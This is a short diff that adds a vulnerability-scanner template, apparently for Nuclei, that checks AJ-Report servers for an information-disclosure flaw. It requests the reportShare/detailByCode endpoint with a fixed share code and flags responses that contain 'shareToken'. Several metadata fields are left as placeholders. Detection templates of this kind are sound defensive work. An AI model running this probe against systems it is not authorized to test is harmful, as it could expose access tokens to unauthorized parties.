@@ -1,0 +1,18 @@
+id: AJ-Report-detailByCode-weak
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: AJ-Report-detailByCode-信息泄露漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/reportShare/detailByCode?shareCode=QRK5ta8g"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'shareToken'
